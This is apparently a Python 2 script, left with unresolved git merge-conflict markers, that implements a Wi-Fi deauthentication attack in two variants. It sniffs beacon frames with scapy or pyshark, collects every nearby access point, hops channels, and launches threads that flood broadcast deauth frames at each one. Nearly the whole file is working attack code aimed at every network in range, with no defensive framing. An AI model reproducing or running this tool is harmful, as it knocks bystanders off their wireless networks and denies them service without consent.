# -*- coding utf-8 -*-
<<<<<<< HEAD
import sys
import os
from multiprocessing import Process
from scapy.all import *
import time
import threading


def sniff_and_attack(p, aps={}):
    if ((p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp)) and not p[Dot11].addr3 in aps):
        ssid = p[Dot11Elt].info
        bssid = p[Dot11].addr3
        channel = int(ord(p[Dot11Elt:3].info))

        aps[bssid] = channel
        arr = aps.keys()
        arr = list(set(arr))
        for bsi in arr:
            sending_thread = threading.Thread(target=send_deauth_pkt,
                                              args=(bsi, aps[bsi],
                                                    send_iface,))
            sending_thread.start()


def channel_hopper():
    while True:
        try:
            channel = random.randrange(1, 15)
            iw_cmd = 'iwconfig %s channel %d' % (recv_iface, channel)
            os.system(iw_cmd + ' 2> /dev/null')
            time.sleep(1)
        except KeyboardInterrupt:
            break


def send_deauth_pkt(bssid, channel, send_iface,
                    target='ff:ff:ff:ff:ff:ff', n=10000):
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    iw_cmd = 'iwconfig %s channel %d' % (send_iface, channel)
    os.system(iw_cmd + ' 2> /dev/null')
    for i in range(n):
        sendp(packet, iface=send_iface, verbose=0)
        print 'Attacking(' + bssid + '): Send the Deauthentication flame:)'
=======
import pyshark
import sys
import time
import threading
from scapy.all import *


def send_deauth_pkt(bssid, send_iface,
                    target='ff:ff:ff:ff:ff:ff', n=1000000):
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=target,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    for i in range(n):
        sendp(packet, iface=send_iface, verbose=0)
        print 'Attacking(' + bssid + '): Send the Deauthentication flame:)'
    return


def ap_info_extractor(pkt):
    ref = {}
    ref['bssid'] = pkt.wlan.bssid
    ref['type'] = pkt.wlan.fc_type
    ref['subtype'] = pkt.wlan.fc_type_subtype
    ref['addr'] = pkt.wlan.addr
    ref['channel'] = pkt.wlan_radio.channel
    ref['frequency'] = pkt.wlan_radio.frequency
    ref['signal'] = pkt.wlan_radio.signal_dbm
    ref['data_rate'] = pkt.wlan_radio.data_rate
    ref['phy'] = pkt.wlan_radio.phy
    return ref
>>>>>>> origin/master


if __name__ == '__main__':
    recv_iface = 'wlan0'
    send_iface = 'wlan1'
<<<<<<< HEAD
    p = Process(target=channel_hopper)
    p.start()
    sniff(iface=recv_iface, prn=sniff_and_attack)
=======
    cap = pyshark.LiveCapture(display_filter="wlan.fc.type_subtype == 0x0008",
                              interface=recv_iface)
    tab = []
    for num, packets in enumerate(cap):
        data = ap_info_extractor(packets)
        data['num'] = num
        bid = data['bssid']
        if bid in tab:
            pass
        else:
            tab.append(bid)
            sending_thread = threading.Thread(target=send_deauth_pkt,
                                              args=(bid, send_iface,))
            sending_thread.start()
        tab = list(set(tab))
>>>>>>> origin/master
